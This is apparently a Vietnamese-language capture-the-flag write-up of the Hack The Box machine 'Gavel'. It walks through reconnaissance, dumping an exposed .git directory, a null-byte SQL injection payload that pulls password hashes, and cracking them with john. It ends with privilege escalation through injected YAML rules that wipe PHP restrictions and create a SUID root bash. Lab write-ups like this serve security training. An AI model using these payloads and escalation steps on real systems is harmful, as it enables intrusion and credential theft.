---
title: Gavel
description: bài này dễ thoi  
date: 2026-01-01 00:00:00+0000
image: image.png
categories:
    - HTB
tags:
    - Linux
weight: Medium
---


# Gavel - Medium - linux 
- Nmap thoi 
![image](https://hackmd.io/_uploads/r15FvGiv-x.png)

```code
nmap -p 22,80  -sV -oN nmap_scan.txt 10.10.11.97
```

- Thêm domain để mở web ở cổng 80 
![image](https://hackmd.io/_uploads/rkH5wzsDZx.png)

```code
echo "10.129.4.176 gavel.htb" | sudo tee -a /etc/hosts
```

- Fuzzing dir 
![image](https://hackmd.io/_uploads/SygsvGsvbg.png)

```code
 ffuf -w /home/tiwza/Desktop/FuzzDir/SecLists/Discovery/Web-Content/common.txt \
  -u http://gavel.htb/FUZZ -e .php \
  -fc 403,301
```

- Kéo code về 
![image](https://hackmd.io/_uploads/HJsivziPZx.png)

```code
git-dumper http://gavel.htb/.git/ ./gavel-source
```

- Đọc code ta sẽ tháy SQL ở hai tham số  `$col` và  `$userId`
![image](https://hackmd.io/_uploads/HkNhDfovbl.png)


Payload:
```code
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```
- `sort=\?;--+-%00`   -> `\0` cắt chuỗi ở **C-level**, trước khi **MySQL** parser xử lý xong
- Thực tế  MySQL nhận chỉ tới `%00` ở tầng C :  **SELECT `\?;-- -**
```code
x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-
```
- Khi này `user_id` sẽ chứa chuỗi inject trên và thực thi SQL
- Câu truy vấn lúc này có dạng như sau 
```code
SELECT `\?;--+- FROM inventory WHERE user_id = x` FROM (SELECT group_concat(username,0x3a,password) AS `'x` FROM users)y;-- - ORDER BY...
       └────────────── COLUMN NAME (vô nghĩa) ──┘      └─────────────── SUBQUERY LẤY DATA ────────────────────────────┘
```
[Tài liệu tham khảo](https://cyberpress.org/php-pdo-flaw/)

![image](https://hackmd.io/_uploads/Hka3PGiD-x.png)

- Sau đó ta nhận được dữ liệu như sau 
```code
auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS

sado:$2y$10$uidTnV0IJozeXfRkqsWlUOs75zvvRzugfaFX1ccLJDd.PVbegqy0.
```
- Crack pass wd **auctioneer : midnight1**

![image](https://hackmd.io/_uploads/HyIpDfswWl.png)

```code
john --format=bcrypt --wordlist=/home/tiwza/Desktop/FuzzDir/rockyou/rockyou.txt hash.txt
```

![image](https://hackmd.io/_uploads/H1W0PfsDbx.png)

- Giờ ta sẽ dùng **auctioneer : midnight1** để login vào admin panel sau đó update rull 
![image](https://hackmd.io/_uploads/r1jCDMiDZx.png)

- Phải trigger đúng **auction_id** mà mình update rule
![image](https://hackmd.io/_uploads/BJikOGoDWl.png)

```code
curl -X POST 'http://gavel.htb/includes/bid_handler.php' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: gavel_session=mmg3c7kkb0talm64bv1fk16rr2' -d 'auction_id=883&bid_amount=50000'
```
![image](https://hackmd.io/_uploads/SyXluzowZe.png)

```code
nc -lvnp 4444
```
![image](https://hackmd.io/_uploads/B1oe_GjDZx.png)

```code
su auctioneer
```
- Tìm các Binary có sắn trên máy mà ta có thể control được
![image](https://hackmd.io/_uploads/HkV-dMjv-e.png)

```code
ls -la /usr/local/bin/
```
- Điều cần chú ý ở đây : `-rwxr-xr-x  1 root gavel-seller 17688 Oct  3 19:35 gavel-util`
  - User: `root`
  - Group: `gavel-seller`
  - Binary có thể được dùng để submit YAML
  
- Vô hiệu hóa PHP sandbox
```code
cat > /home/auctioneer/fix_ini.yaml << 'EOF'
name: fixini
description: fix php ini
image: "x.png"
price: 1
rule_msg: "fixini"
rule: file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\nopen_basedir=\ndisable_functions=\n"); return false;
EOF
```
- Dùng Binary vừa tìm được để gửi file `.yaml` để ghi đè , xóa bỏ mọi restriction
```code
/usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
```
- Tạo SUID bash
```code
cat > /home/auctioneer/rootshell.yaml << 'EOF'
name: rootshell
description: make suid bash
image: "x.png"
price: 1
rule_msg: "rootshell"
rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;
EOF
```
- `cp /bin/bash /opt/gavel/rootbash` → Copy bash binary
- `chmod u+s /opt/gavel/rootbash` → Set SUID bit
- SUID bit nghĩa là: khi user bất kỳ chạy file này, nó sẽ chạy với quyền của owner **(root)**
- Vì **gavel-util** chạy với quyền root → file được tạo thuộc sở hữu root → SUID bash = root shell
![image](https://hackmd.io/_uploads/Sy0Zdziv-g.png)


END...........................................

![image](https://hackmd.io/_uploads/BywfdGivZe.png)










